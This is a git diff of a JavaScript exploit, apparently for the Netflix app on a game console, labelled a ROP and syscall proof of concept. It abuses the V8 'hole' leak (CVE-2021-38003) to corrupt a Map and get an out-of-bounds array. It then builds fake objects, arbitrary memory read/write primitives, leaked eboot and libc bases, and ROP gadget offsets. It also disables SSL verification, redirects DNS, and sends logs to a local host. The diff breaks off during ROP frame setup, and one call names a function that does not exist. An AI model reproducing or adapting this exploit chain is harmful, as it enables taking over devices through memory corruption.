@@ -2,65 +2,95 @@
 // based on https://starlabs.sg/blog/2022/12-the-hole-new-world-how-a-small-leak-will-sink-a-great-browser-cve-2021-38003/
 // thanks to Gezines y2jb for advice and reference : https://github.com/Gezine/Y2JB/blob/main/download0/cache/splash_screen/aHR0cHM6Ly93d3cueW91dHViZS5jb20vdHY%3D/splash.html
 
-// #region WebSocket
-const ws = {
-    socket: null,
-    init(ip, port, callback) {
-        nrdp.gibbon._runConsole("/command ssl-peer-verification false");
+// ROP and Syscall PoC by c0w-ar
 
-        nrdp.dns.set("pwn.netflix.com", nrdp.dns.A, {
-            addresses: [ip],
-            ttl: 3600000
-        });
+var bs = new ArrayBuffer(8);
+var fs = new Float64Array(bs);
+var is = new BigUint64Array(bs);
 
-        this.socket = new nrdp.WebSocket(`wss://pwn.netflix.com:${port}`);
-        this.socket.onopen = callback;
-    },
-    send(msg) {
-        if (this.socket && this.socket.readyState !== this.socket.CLOSED) {
-            this.socket.send(msg);
-        }
-    }
+/* converts a float to a 64-bit uint */
+function ftoi(x) {
+    fs[0] = x;
+    return is[0];
 }
-// #endregion
-// #region Logger
-const logger = {
-    overlay: null,
-    lines: [],
-    maxLines: 40,
-    refreshTimer: null,
-    init() {
-        this.overlay = nrdp.gibbon.makeWidget({
-            name: "dbg",
-            width: 1280,
-            height: 720,
-            backgroundColor: "#000000"
-        });
+
+/* converts a 64-bit uint to a float */
+function itof(x) {
+    is[0] = x;
+    return fs[0];
+}
+
+function trigger() {
+    let v1;
+
+    function f0(v4) { v4(() => {}, v5 => { v1 = v5.errors; }); }
+
+    f0.resolve = (v6) => { return v6; };
+
+    let v3 = { then(v7, v8) { v8(); } };
+
+    Promise.any.call(f0, [v3]);
+
+    return v1[1];
+}
+
+function hex(value)
+{
+    return "0x" + value.toString(16).padStart(8, "0");
+}
+
+(function() {
+    var overlay = null;
+    var lines = [];
+    var maxLines = 40;
+    var refreshTimer = null;
     
-        nrdp.gibbon.scene.overlay = this.overlay;
-    },
-    log(msg) {
-        ws.send(msg);
-        this.lines.push(msg);
-        if (this.lines.length > this.maxLines) this.lines.shift();
-        if (this.refreshTimer) nrdp.clearTimeout(this.refreshTimer);
-        this.refreshTimer = nrdp.setTimeout(() => {
-            this.refresh();
-            this.refreshTimer = null;
+    
+    function send_to_old_gen(){
+        for (var i = 0; i < 10 ; i++){
+                nrdp.gibbon.garbageCollect();
+            }
+    }
+    
+    function disable_gc(){ //yeah right lol
+        time = -1 //9999999999
+        nrdp.script.garbageCollectTimeout = time;
+        nrdp.gibbon.garbageCollectTimeout = time;
+        nrdp.options.garbage_collect_timeout = time;
+    }
+    
+    var netlog = function(msg) {
+        try {
+            nrdp.gibbon.load({
+                url: "https://10.0.0.2/?log=" + encodeURIComponent(msg),
+                requestMethod: "GET",
+                secure: false
+            }, function() {});
+        } catch (ex) {}
+    };
+
+    var log = function(msg) {
+        netlog(msg);
+        lines.push(msg);
+        if (lines.length > maxLines) lines.shift();
+        if (refreshTimer) nrdp.clearTimeout(refreshTimer);
+        refreshTimer = nrdp.setTimeout(function() {
+            refresh();
+            refreshTimer = null;
         }, 50);
-    },
-    refresh() {
-        if (!this.overlay) return;
-        if (this.overlay.children) {
-            for (var j = this.overlay.children.length - 1; j >= 0; j--) {
-                var child = this.overlay.children[j];
+    };
+
+    function refresh() {
+        if (!overlay) return;
+        if (overlay.children) {
+            for (var j = overlay.children.length - 1; j >= 0; j--) {
+                var child = overlay.children[j];
                 if (child && child._name && child._name.startsWith("ln")) {
-                    this.overlay.removeChild(child);
+                    overlay.removeChild(child);
                 }
             }
         }
-
-        for (var i = 0; i < this.lines.length; i++) {
+        for (var i = 0; i < lines.length; i++) {
             var w = nrdp.gibbon.makeWidget({
                 name: "ln" + i,
                 x: 10,
@@ -68,10 +98,9 @@ const logger = {
                 width: 1260,
                 height: 15
             });
-            
             w.text = {
-                contents: this.lines[i],
-                size: 12,
+                contents: lines[i],
+                size: 8,
                 color: {
                     a: 255,
                     r: 0,
@@ -80,571 +109,711 @@ const logger = {
                 },
                 wrap: false
             };
-
-            w.parent = this.overlay;
+            w.parent = overlay;
         }
     }
-}
-// #endregion
-// #region Pointer Helpers
-const buf = new ArrayBuffer(8);
-const view = new DataView(buf);
-const ptr = {
-    il2ih(value) {
-        return value << 0x20n;
-    },
-    ih2il(value) {
-        return value >> 0x20n;
-    },
-    ih(value) {
-        return value & ~0xFFFFFFFFn;
-    },
-    il(value) {
-        return value & 0xFFFFFFFFn;
-    },
-    itag(value) {
-    	return value | 1n;
-    },
-    iuntag(value) {
-    	return value & ~1n;
-    },
-    f2i(value) {
-        view.setFloat64(0, value, true);
-        return view.getBigUint64(0, true);
-    },
-    f2ih(value) {
-        view.setFloat64(0, value, true);
-        return BigInt(view.getUint32(4, true));
-    },
-    f2il(value) {
-        view.setFloat64(0, value, true);
-        return BigInt(view.getUint32(0, true));
-    },
-    i2f(value) {
-        view.setBigUint64(0, value, true);
-        return view.getFloat64(0, true);
-    },
-    i2h(value, padded = true) {
-        let str = value.toString(16).toUpperCase();
-        if (padded) {
-            str = str.padStart(16, '0');
+
+    overlay = nrdp.gibbon.makeWidget({
+        name: "dbg",
+        width: 1280,
+        height: 720,
+        backgroundColor: "#000000"
+    });
+    nrdp.gibbon.scene.overlay = overlay;
+
+    nrdp.gibbon._runConsole("/command ssl-peer-verification false");
+    nrdp.dns.set("pwn.netflix.com", nrdp.dns.A, {
+        addresses: ["10.0.0.2"],
+        ttl: 3600000
+    });
+
+    log("=== Netflix n Hack ===");
+
+    try {
+
+        let hole = trigger();
+
+        let string = "TEXT";
+
+        map1 = new Map();
+        map1.set(1, 1);
+        map1.set(hole, 1);
+
+        map1.delete(hole);
+        map1.delete(hole);
+        map1.delete(1);
+
+        oob_arr_temp = new Array(1.1, 2.2, 3.3); // Temporal due that cannot reach a bui64 with map
+        oob_arr =  new BigUint64Array([0x4141414141414141n,0x4141414141414141n]);
+        victim_arr = new BigUint64Array([0x5252525252525252n,0x5252525252525252n]);
+        obj_arr = new Array({},{});
+
+        map1.set(0x10, -1);
+        nrdp.gibbon.garbageCollect();
+        map1.set(oob_arr_temp, 0x200);
+        
+        // Let's make oob_arr oversize
+        oob_arr_temp[18] = itof(0x1000n*8n);  // Size in bytes
+        oob_arr_temp[19]= itof(0x1000n);      // Size in elements
+
+        // From this point on we can use oob_arr as a more 'stable' primitive until fake objs
+
+        // Elements ptr of victim_arr in first 32b of oob_arr[22]
+        // external_ptr[0:31]   --> (oob_arr[25] & ~0xffffffffn) >> 32n
+        // external_ptr[63:32]  --> (oob_arr[26] & 0xffffffffn) << 32n
+        // base_ptr[0:31]       --> (oob_arr[26] & ~0xffffffffn) >> 32n
+        // base_ptr[0:31]       --> (oob_arr[27] & 0xffffffffn) << 32n
+
+        // Elements Ptr of obj_arr in lower 32b (first in mem) of oob_arr[37]
+        // Value of obj_arr[0] (ptr to obj) in lower 32b (first in mem) of oob_arr[39]
+
+        function addrof_unstable (obj) {
+            obj_arr[0] = obj;
+            return (oob_arr[39] & 0xffffffffn) -1n;
         }
-        return `0x${str}`;
-    }
-}
-// #endregion
-// #region Primitives
-let map, oob_arr, flt_arr, obj_arr;
-const rw = {
-    flt_elem_index: 7,
-    obj_elem_index: 14,
-    flt_elem: 0,
-    obj_elem: 0,
-    init() {
-        let hole = this.make_hole();
 
-        map = new Map();
-        map.set(1, 1);
-        map.set(hole, 1);
-        map.delete(hole);
-        map.delete(hole);
-        map.delete(1);
-
-        oob_arr = new Array(1.1, 1.1);
-        flt_arr = [2.2];
-        obj_arr = [{}];
-
-        logger.log(`OOB array length: ${oob_arr.length}`);
-
-        map.set(0x10, -1);
-        map.set(oob_arr, 0x100);
-
-        logger.log("Achieved OOB !!");
-
-        logger.log(`OOB array length: ${oob_arr.length}`);
-
-        this.flt_elem = ptr.f2i(oob_arr[this.flt_elem_index]);
-        this.obj_elem = ptr.f2i(oob_arr[this.obj_elem_index]);
-    },
-    addrof(obj) {
-        oob_arr[this.obj_elem_index] = ptr.i2f(this.obj_elem);
-        obj_arr[0] = obj;
-        oob_arr[this.flt_elem_index] = ptr.i2f(this.obj_elem);
-        return ptr.iuntag(ptr.f2il(flt_arr[0]));
-    },
-    fakeobj(addr) {
-        oob_arr[this.flt_elem_index] = ptr.i2f(this.flt_elem);
-        flt_arr[0] = ptr.i2f(ptr.ih(ptr.f2i(flt_arr[0])) | ptr.il(ptr.itag(addr)));
-        oob_arr[this.obj_elem_index] = ptr.i2f(this.flt_elem);
-        return obj_arr[0];
-    },
-    read(addr, untag = false) {
-        oob_arr[this.flt_elem_index] = ptr.i2f(ptr.ih(this.flt_elem) | ptr.il(ptr.itag(addr) - 8n));
-        let value = ptr.f2i(flt_arr[0]);
-        oob_arr[this.flt_elem_index] = ptr.i2f(this.flt_elem);
-        return untag ? ptr.iuntag(value) : value;
-    },
-    write(addr, value, untag = false) {
-        oob_arr[this.flt_elem_index] = ptr.i2f(ptr.ih(this.flt_elem) | ptr.il(ptr.itag(addr) - 8n));
-        flt_arr[0] = ptr.i2f(untag ? ptr.iuntag(value) : value);
-        oob_arr[this.flt_elem_index] = ptr.i2f(this.flt_elem);
-    },
-    read32(addr, untag = false) {
-        oob_arr[this.flt_elem_index] = ptr.i2f(ptr.ih(this.flt_elem) | ptr.il(ptr.itag(addr) - 8n));
-        let value = ptr.il(ptr.f2i(flt_arr[0]));
-        oob_arr[this.flt_elem_index] = ptr.i2f(this.flt_elem);
-        return untag ? ptr.iuntag(value) : value;
-    },
-    write32(addr, value, untag = false) {
-        oob_arr[this.flt_elem_index] = ptr.i2f(ptr.ih(this.flt_elem) | ptr.il(ptr.itag(addr) - 8n));
-        flt_arr[0] = ptr.i2f(ptr.ih(ptr.f2i(flt_arr[0])) | ptr.il(untag ? ptr.iuntag(value) : value));
-        oob_arr[this.flt_elem_index] = ptr.i2f(this.flt_elem);
-    },
-    make_hole() {
-        let v1;
-        function f0(v4) {
-            v4(() => { }, v5 => {
-                v1 = v5.errors;
-            });
+        function create_fakeobj_unstable(add) {
+            let add_32 = add & 0xffffffffn +1n;     // Just in case 32bits
+            let original_value = oob_arr[39];   // Grab full 64bits add in oob_arr[41] to 'save' upper 32bits
+            let new_value = (original_value & ~0xffffffffn) + ((add+1n) & 0xffffffffn);
+            oob_arr[39] = new_value;
+            const fake_obj = obj_arr[0];
+            return fake_obj;
         }
-        f0.resolve = function (v6) {
-            return v6;
+
+        function read64_unstable (add) {
+            let add_32 = add & 0xffffffffn;     // Just in case 32bits
+
+            let original_value_25 = oob_arr[25];
+            let original_value_26 = oob_arr[26];
+
+            let external_ptr_org_63_32 = (oob_arr[26] & 0xffffffffn);
+            
+            oob_arr[25] = (original_value_25 & 0xffffffffn) + (add_32 << 32n);
+            oob_arr[26] = external_ptr_org_63_32; // re-use upper32 bits of heap from external_ptr, base_ptr 0
+
+            let read_value = victim_arr[0]; // Read the value
+
+            oob_arr[25] = original_value_25;
+            oob_arr[26] = original_value_26;
+
+            return read_value;
+        }
+
+        function write64_unstable (add, value) {
+            let add_32 = add & 0xffffffffn;     // Just in case 32bits
+
+            let original_value_25 = oob_arr[25];
+            let original_value_26 = oob_arr[26];
+
+            let external_ptr_org_63_32 = (oob_arr[26] & 0xffffffffn);
+
+            oob_arr[25] = (original_value_25 & 0xffffffffn) + (add_32 << 32n);
+            oob_arr[26] = external_ptr_org_63_32; // re-use upper32 bits of heap from external_ptr, base_ptr 0
+
+            victim_arr[0] = value;  // Write the value
+
+            oob_arr[25] = original_value_25;
+            oob_arr[26] = original_value_26;
+        }     
+
+        function read32_unstable(add){
+            let read = read64_unstable(add);
+            return read & 0xffffffffn;
+        }
+
+        function write32_unstable(add, value) {
+            let read = read64_unstable(add);
+            let new_value = (read & ~0xffffffffn) | (BigInt(value) & 0xffffffffn);
+            write64_unstable(add, new_value);
+        }      
+        
+        
+        let add_string = addrof_unstable(string) + 12n;
+        log("Address of 'string' text: " + hex(add_string));
+        log("Original value of 'string' (should be 0x54584554): 0x" + read32_unstable(add_string).toString(16) ) ;
+
+        write32_unstable(add_string, 0x41414141n);
+        log("Overwritten value of 'string' (should be AAAA): " + string );
+        
+        let typed_arr = new Int8Array(8);
+        let base_heap_add = read64_unstable(addrof_unstable(typed_arr) + 10n * 4n) & ~0xffffffffn;
+        let top32b_heap = base_heap_add >> 32n;
+        log("Base heap address: " + hex(base_heap_add));
+        log("Top 32bits heap address: " + hex(top32b_heap));
+        let leak_eboot_add = read64_unstable(0x28n); // Read at base heap + 0x28 (upper 32b are completed by v8)
+        let eboot_base = leak_eboot_add - 0x8966C8n; // This is not realiable as the addess changes
+        // Previously used offsets: 0x88C76En , 0x8966C8n
+        // Seems to be a ptr that the app updates while running
+        // If nothing is changed in the code before this point, it should not change
+        log("Leaked eboot add : " + hex(leak_eboot_add));
+        log("eboot base : " + hex(eboot_base));
+        
+        
+        /***** Start of Stable Primitives based on fake obj *****/
+        /*****        Base on code from Gezine Y2JB         *****/
+
+        // Allocate Large Object Space with proper page metadata
+        // Create object array first to initialize page structures
+        const stable_array = new Array(0x8000);
+        for (let i = 0; i < stable_array.length; i++) {
+            stable_array[i] = {};
+        }
+  
+        // Get FixedDoubleArray map from a template
+        const double_template = new Array(0x10);
+        double_template.fill(3.14);
+        const double_template_addr = addrof_unstable(double_template);
+        const double_elements_addr = read32_unstable(double_template_addr + 0x8n) - 1n;
+        const fixed_double_array_map = read32_unstable(double_elements_addr + 0x00n);
+        
+        // Get stable_array addresses
+        const stable_array_addr = addrof_unstable(stable_array);
+        const stable_elements_addr = read32_unstable(stable_array_addr + 0x8n) - 1n;
+              
+        log('Large Object Space @ ' + hex(stable_elements_addr));
+        
+        // Transform elements to FixedDoubleArray
+        // This makes GC happy later
+        write32_unstable(stable_elements_addr + 0x00n, fixed_double_array_map);
+        
+        log('Converted stable_array to double array');
+        
+        for (let i = 0; i < stable_array.length; i++) {
+            stable_array[i] = 0;
+        }
+
+        console.log("Reserved space filled with 0s");
+
+        // Get templates for stable primitives
+
+        /***** Template for BigUint64Array *****/
+        const template_biguint = new BigUint64Array(64);
+
+        const template_biguint_addr = addrof_unstable(template_biguint);
+        const biguint_map =      read32_unstable(template_biguint_addr + 0x00n);
+        const biguint_props =    read32_unstable(template_biguint_addr + 0x04n);
+        const biguint_elements = read32_unstable(template_biguint_addr + 0x08n) - 1n;
+        const biguint_buffer =   read32_unstable(template_biguint_addr + 0x0Cn) - 1n;
+        
+        const biguint_elem_map = read32_unstable(biguint_elements + 0x00n);
+        const biguint_elem_len = read32_unstable(biguint_elements + 0x04n);
+
+        const biguint_buffer_map =      read32_unstable(biguint_buffer + 0x00n);
+        const biguint_buffer_props =    read32_unstable(biguint_buffer + 0x04n);
+        const biguint_buffer_elem =     read32_unstable(biguint_buffer + 0x08n);
+        const biguint_buffer_bitfield = read32_unstable(biguint_buffer + 0x24n);
+
+        /***** Template for Object Array *****/
+        const template_obj_arr = [{},{}];
+
+        const template_obj_arr_addr = addrof_unstable(template_obj_arr);
+        const obj_arr_map =      read32_unstable(template_obj_arr_addr + 0x00n);
+        const obj_arr_props =    read32_unstable(template_obj_arr_addr + 0x04n);
+        const obj_arr_elements = read32_unstable(template_obj_arr_addr + 0x08n) - 1n;
+        const obj_arr_len =      read32_unstable(template_obj_arr_addr + 0x0Cn);
+        
+        const obj_arr_elem_map = read32_unstable(obj_arr_elements + 0x00n);
+        const obj_arr_elem_len = read32_unstable(obj_arr_elements + 0x04n);
+
+        log('Templates extracted');
+
+
+        const base = stable_elements_addr + 0x100n;
+
+        /*******************************************************/
+        /*****       Memory Layout for fake Objects        *****/
+        /*******************************************************/
+        /***** fake_rw header:          0x0000             *****/
+        /***** fake_rw buffer:          0x0040             *****/
+        /***** fake_rw elements:        0x1000             *****/
+        /*******************************************************/
+        /***** fake_bui64_arr header:   0x0100 (inside rw) *****/
+        /***** fake_bui64_arr buffer:   0x0150 (inside rw) *****/
+        /***** fake_bui64_arr elements: 0x1100             *****/
+        /*******************************************************/
+        /***** fake_obj_arr header:     0x0200 (inside rw) *****/
+        /***** fake_obj_arr elements:   0x0250 (inside rw) *****/
+        /*******************************************************/
+       
+        // Inside fake_rw_data: fake Array's elements (at the beginning)
+        const fake_rw_obj = base + 0x0000n;
+        const fake_rw_obj_buffer = base + 0x0040n;
+        const fake_rw_obj_elements = base + 0x1000n;
+
+        const fake_bui64_arr_obj = base + 0x0100n;
+        const fake_bui64_arr_buffer = base + 0x0150n;
+        const fake_bui64_arr_elements = base + 0x1100n;
+
+        const fake_obj_arr_obj = base + 0x0200n;
+        const fake_obj_arr_elements = base + 0x0250n;
+
+        /*******************************************************************************************************/
+        /**********                             Init Fake OOB BigUInt64Array                          **********/
+        /*******************************************************************************************************/
+        write32_unstable(fake_rw_obj_buffer + 0x00n, biguint_buffer_map);
+        write32_unstable(fake_rw_obj_buffer + 0x04n, biguint_buffer_props);
+        write32_unstable(fake_rw_obj_buffer + 0x08n, biguint_buffer_elem);
+        write32_unstable(fake_rw_obj_buffer + 0x0cn, 0x1000n*8n);      // byte_length lower 32b
+        write32_unstable(fake_rw_obj_buffer + 0x14n, fake_rw_obj_elements + 8n +1n);  // backing_store lower 32b
+        write32_unstable(fake_rw_obj_buffer + 0x18n, top32b_heap);                    // backing_store upper 32b
+        write32_unstable(fake_rw_obj_buffer + 0x24n, biguint_buffer_bitfield);  // bit_field
+
+        write32_unstable(fake_rw_obj_elements + 0x00n, biguint_elem_map);
+        write32_unstable(fake_rw_obj_elements + 0x04n, biguint_elem_len);  // Fake size in bytes
+
+        write32_unstable(fake_rw_obj + 0x00n, biguint_map);
+        write32_unstable(fake_rw_obj + 0x04n, biguint_props);
+        write32_unstable(fake_rw_obj + 0x08n, fake_rw_obj_elements + 1n);
+        write32_unstable(fake_rw_obj + 0x0Cn, fake_rw_obj_buffer + 1n);
+        write64_unstable(fake_rw_obj + 0x18n, 0x8000n);      // Fake size in bytes
+        write64_unstable(fake_rw_obj + 0x20n, 0x1000n);      // Fake size in elements
+        write32_unstable(fake_rw_obj + 0x28n, fake_rw_obj_buffer + 16n*4n);  // external_pointer lower 32b
+        write32_unstable(fake_rw_obj + 0x2Cn, top32b_heap);  // external_pointer upper 32b
+        write32_unstable(fake_rw_obj + 0x30n, 0n);  // base_pointer lower 32b
+        write32_unstable(fake_rw_obj + 0x34n, 0n);  // base_pointer upper 32b
+        /*******************************************************************************************************/
+        /**********                             End Fake OOB BigUInt64Array                           **********/
+        /*******************************************************************************************************/
+
+        /*******************************************************************************************************/
+        /**********                             Init Fake Victim BigUInt64Array                       **********/
+        /*******************************************************************************************************/
+        write32_unstable(fake_bui64_arr_buffer + 0x00n, biguint_buffer_map);
+        write32_unstable(fake_bui64_arr_buffer + 0x04n, biguint_buffer_props);
+        write32_unstable(fake_bui64_arr_buffer + 0x08n, biguint_buffer_elem);
+        write32_unstable(fake_bui64_arr_buffer + 0x0cn, 0x1000n*8n);      // byte_length lower 32b
+        write32_unstable(fake_bui64_arr_buffer + 0x14n, fake_bui64_arr_elements + 8n +1n);  // backing_store lower 32b
+        write32_unstable(fake_bui64_arr_buffer + 0x18n, top32b_heap);                    // backing_store upper 32b
+        write32_unstable(fake_bui64_arr_buffer + 0x24n, biguint_buffer_bitfield);  // bit_field
+
+        write32_unstable(fake_bui64_arr_elements + 0x00n, biguint_elem_map);
+        write32_unstable(fake_bui64_arr_elements + 0x04n, biguint_elem_len);  // Fake size in bytes
+
+        write32_unstable(fake_bui64_arr_obj + 0x00n, biguint_map);
+        write32_unstable(fake_bui64_arr_obj + 0x04n, biguint_props);
+        write32_unstable(fake_bui64_arr_obj + 0x08n, fake_bui64_arr_elements + 1n);
+        write32_unstable(fake_bui64_arr_obj + 0x0Cn, fake_bui64_arr_buffer + 1n);
+        write64_unstable(fake_bui64_arr_obj + 0x18n, 0x40n);      // Fake size in bytes
+        write64_unstable(fake_bui64_arr_obj + 0x20n, 0x08n);      // Fake size in elements
+        write32_unstable(fake_bui64_arr_obj + 0x28n, fake_bui64_arr_buffer + 16n*4n);  // external_pointer lower 32b
+        write32_unstable(fake_bui64_arr_obj + 0x2Cn, top32b_heap);  // external_pointer upper 32b
+        write32_unstable(fake_bui64_arr_obj + 0x30n, 0n);  // base_pointer lower 32b
+        write32_unstable(fake_bui64_arr_obj + 0x34n, 0n);  // base_pointer upper 32b
+        /*******************************************************************************************************/
+        /**********                             End Fake Victim BigUInt64Array                        **********/
+        /*******************************************************************************************************/
+
+        /*******************************************************************************************************/
+        /**********                             Init Fake Obj Array                                   **********/
+        /*******************************************************************************************************/
+        write32_unstable(fake_obj_arr_obj + 0x00n, obj_arr_map);
+        write32_unstable(fake_obj_arr_obj + 0x04n, obj_arr_props);
+        write32_unstable(fake_obj_arr_obj + 0x08n, fake_obj_arr_elements+1n);
+        write32_unstable(fake_obj_arr_obj + 0x0cn, obj_arr_len);      // byte_length lower 32b
+
+        write32_unstable(fake_obj_arr_elements + 0x00n, obj_arr_elem_map);
+        write32_unstable(fake_obj_arr_elements + 0x04n, obj_arr_elem_len);  // size in bytes << 1
+        /*******************************************************************************************************/
+        /**********                             End Fake Obj Array                                    **********/
+        /*******************************************************************************************************/
+
+        // Materialize fake objects
+        const fake_rw = create_fakeobj_unstable(fake_rw_obj);
+        let fake_rw_add = addrof_unstable(fake_rw);
+        //log("This is the add of fake_rw materialized : " + hex(fake_rw_add));
+
+        const fake_victim = create_fakeobj_unstable(fake_bui64_arr_obj);
+        let fake_victim_add = addrof_unstable(fake_victim);
+        //log("This is the add of fake_victim materialized : " + hex(fake_victim_add));
+
+        const fake_obj_arr = create_fakeobj_unstable(fake_obj_arr_obj);
+        let fake_obj_arr_add = addrof_unstable(fake_obj_arr);
+        //log("This is the add of fake_obj_arr materialized : " + hex(fake_obj_arr_add));
+
+        // Now we have OOB, Victim and Obj to make stable primitives
+
+        function addrof (obj) {
+          fake_obj_arr[0] = obj;
+          return (fake_rw[59] & 0xffffffffn) - 1n;
+        }
+
+
+        /***** The following primitives r/w a compressed Add *****/
+        /***** The top 32 bits are completed with top32b_heap *****/
+
+        function read64 (add) {
+          let add_32 = add & 0xffffffffn; // Just in case
+          let original_value = fake_rw[21];
+          fake_rw[21] = (top32b_heap<<32n) + add_32; // external_ptr of buffer
+          let read_value = fake_victim[0];
+          fake_rw[21] = original_value;
+          return read_value;
+        }
+
+        function write64 (add, value) {
+          let add_32 = add & 0xffffffffn; // Just in case
+          let original_value = fake_rw[21];
+          fake_rw[21] = (top32b_heap<<32n) + add_32; // external_ptr of buffer
+          fake_victim[0] = value;
+          fake_rw[21] = original_value;
+        }
+
+        function read32(add){
+          let read = read64(add);
+          return  read & 0xffffffffn;
+        }
+
+        function write32(add, value) {
+          let read = read64(add);
+          let new_value = (read & ~0xffffffffn) | (BigInt(value) & 0xffffffffn);
+          write64(add, new_value);
+        }
+
+        function read16(add){
+          let read1 = read64(add);
+          return  read1 & 0xffffn;
+        }
+
+        function write16(add, value) {
+          let read = read64(add);
+          let new_value = (read & ~0xffffn) | (BigInt(value) & 0xffffn);
+          write64(add, new_value);
+        }
+
+        function read8(add){
+          let read = read64(add);
+          return  read & 0xffn;
+        }
+
+        function write8(add, value) {
+          let read = read64(add);
+          let new_value = (read & ~0xffn) | (BigInt(value) & 0xffn);
+          write64(add, new_value);
+        }
+
+        /***** The following primitives r/w a full 64bits Add *****/        
+
+        function read64_uncompressed (add) {
+          let original_value = fake_rw[21];
+          fake_rw[21] = add; // external_ptr of buffer
+          let read_value = fake_victim[0];
+          fake_rw[21] = original_value;
+          return read_value;
+        }
+
+        function write64_uncompressed (add, value) {
+          let original_value = fake_rw[21];
+          fake_rw[21] = add; // external_ptr of buffer
+          fake_victim[0] = value;
+          fake_rw[21] = original_value;
+        }
+
+        function read32_uncompressed(add){
+          let read = read642_uncompressed(add);
+          return  read & 0xffffffffn;
+        }
+
+        function write32_uncompressed(add, value) {
+          let read = read64_uncompressed(add);
+          let new_value = (read & ~0xffffffffn) | (BigInt(value) & 0xffffffffn);
+          write64_uncompressed(add, new_value);
+        }
+
+        function read16_uncompressed(add){
+          let read = read64_uncompressed(add);
+          return  read & 0xffffn;
+        }
+
+        function write16_uncompressed(add, value) {
+          let read = read64_uncompressed(add);
+          let new_value = (read & ~0xffffn) | (BigInt(value) & 0xffffn);
+          write64_uncompressed(add, new_value);
+        }
+
+        function read8_uncompressed(add){
+          let read = read64_uncompressed(add);
+          return  read & 0xffn;
+        }
+
+        function write8_uncompressed(add, value) {
+          let read = read64_uncompressed(add);
+          let new_value = (read & ~0xffn) | (BigInt(value) & 0xffn);
+          write64_uncompressed(add, new_value);
+        }
+
+        function get_backing_store(typed_array) {
+          const obj_addr = addrof(typed_array);
+          const external = read64(obj_addr + 0x28n);
+          const base = read64(obj_addr + 0x30n);
+          return base + external;
+        }
+
+        let allocated_buffers = [];
+
+        function malloc (size) {
+            const buffer = new ArrayBuffer(size);
+            const buffer_addr = addrof(buffer);
+            const backing_store = read64(buffer_addr + 0x14n);
+            allocated_buffers.push(buffer);
+            log("Returned backing_store in malloc: " + hex(backing_store) );
+            return backing_store;
+        }
+
+        log("Stable Primitives Achieved.");
+
+        const rop_chain = new BigUint64Array(0x1000);
+        const rop_address = get_backing_store(rop_chain);
+        log("Address of ROP obj: " + hex(addrof(rop_chain)) );
+        log("Address of ROP: " + hex(rop_address) );
+
+        function rop_smash (x) {
+          let a = 100;
+          return 0x1234567812345678n;   // We need a function with a 'constant' element
+        }
+
+        let value_delete = rop_smash(1); // Generate Bytecode
+
+        add_rop_smash = addrof(rop_smash);
+        log("This is the add of function 'rop_smash': " + hex(add_rop_smash) );
+        add_rop_smash_sharedfunctioninfo = read32(add_rop_smash + 0x0Cn) -1n;
+        add_rop_smash_code = read32(add_rop_smash_sharedfunctioninfo + 0x04n) -1n;
+        add_rop_smash_code_store = add_rop_smash_code + 0x22n;
+        //add_rop_smash_constants_list = read32(add_rop_smash_code + 0x08n) -1n;
+        //add_rop_smash_constant_0 = read32(add_rop_smash_constants_list + 0x08n) -1n + 8n;
+        
+
+        const fake_frame = new BigUint64Array(8);     // Up to 8 * 8bytes are created inmediatly before the main Obj
+        const add_fake_frame = addrof(fake_frame);
+        const white_space_2 = new BigInt64Array(8);
+        const white_space_3 = new BigInt64Array(8);
+        log("Address of fake_frame: 0x" + hex(add_fake_frame) );
+
+        const fake_bytecode_buffer = new BigUint64Array(8);
+        const add_fake_bytecode_store = get_backing_store(fake_bytecode_buffer);
+        log("Address of fake_bytecode_buffer: " + hex(addrof(fake_bytecode_buffer)) );
+        log("Address of add_fake_bytecode_store: " + hex(add_fake_bytecode_store) );
+
+        const return_value_buffer = new BigUint64Array(8);
+        const return_value_addr = get_backing_store(return_value_buffer);
+        log("Address of return_value_buffer: " + hex(addrof(return_value_buffer)) );
+        log("Address of return_value_buffer_store: " + hex(return_value_addr) );
+
+        /** Gadgets for Function Arguments **/
+        const g_pop_rax = 0x6c233n;
+        const g_pop_rdi = 0x1a729bn;
+        const g_pop_rsi = 0x14d8n;
+        const g_pop_rdx = 0x3ec42n;
+        const g_pop_rcx = 0x2485n;
+        const g_pop_r8 = 0x6c232n;
+        const g_pop_r9 = 0x66511bn;
+        
+        /** Other Gadgets **/
+        const g_pop_rbp = 0x79n;
+        const g_pop_rbx = 0x2e1ebn;
+        const g_pop_rsp = 0x1df1e1n;
+        const g_pop_rsp_pop_rbp = 0x17ecb4en;
+        const g_mov_qword_ptr_rdi_rax = 0x1dcba9n;
+
+        /***** LibC *****/
+        const libc_base = read64_uncompressed(eboot_base + 0x241F2B0n) - 0x1C0n;
+        log("libc base : " + hex(libc_base));
+        //const libc_base2 = read64_uncompressed(eboot_base + 0x27EC408n) - 0x2C17n;
+        //log("libc base: " + hex(libc_base2));
+        const gettimeofdayAddr = read64_uncompressed(libc_base + 0x10f998n);
+        log("gettimeofdayAddr : " + hex(gettimeofdayAddr));
+        const syscall_wrapper = gettimeofdayAddr + 0x7n;
+        log("syscall_wrapper : " + hex(syscall_wrapper));
+        
+        /***** LibKernel *****/ // TO DO
+        //const libkernel_base = 0x80EA14000n;
+        //log("libkernel base: " + hex(libkernel));
+
+        fake_bytecode_buffer[0] = 0xABn;
+        fake_bytecode_buffer[1] = 0x00n;
+        fake_bytecode_buffer[2] = 0x00n;    // Here is the value of RBP , force 0
+
+        /*
+        Address	    Instruction
+        734217FB	jmp 0x73421789
+        734217FD	mov rbx, qword ptr [rbp - 0x20] --> Fake Bytecode buffer on rbx
+        73421801	mov ebx, dword ptr [rbx + 0x17] --> Fake Bytecode buffer + 0x17 (part of fake_bytecode[2])
+        73421804	mov rcx, qword ptr [rbp - 0x18] --> Value forced to 0xff00000000000000
+        73421808	lea rcx, [rcx*8 + 8]
+        73421810	cmp rbx, rcx
+        73421813	jge 0x73421818                  --> Because of forced value, it jumps right to the leave
+        73421815	mov rbx, rcx
+        73421818	leave
+        73421819	pop rcx
+        7342181A	add rsp, rbx                    --> RBX should be 0 here
+        7342181D	push rcx
+        7342181E	ret
+        */
+
+        write64(add_fake_frame  - 0x20n, add_fake_bytecode_store);  // Put the return code (by pointer) in R14
+                                                                    // this is gonna be offseted by R9
+        write64(add_fake_frame  - 0x28n, 0x00n);                    // Force the value of R9 = 0                                                                          
+        write64(add_fake_frame  - 0x18n, 0xff00000000000000n); // Fake value for (Builtins_InterpreterEntryTrampoline+286) to skip break * Builtins_InterpreterEntryTrampoline+303
+                                                                          
+        write64(add_fake_frame + 0x08n, eboot_base + g_pop_rsp); // pop rsp ; ret --> this change the stack pointer to your stack
+        write64(add_fake_frame + 0x10n, rop_address);
+
+        // This function is calling a given function address and takes all arguments
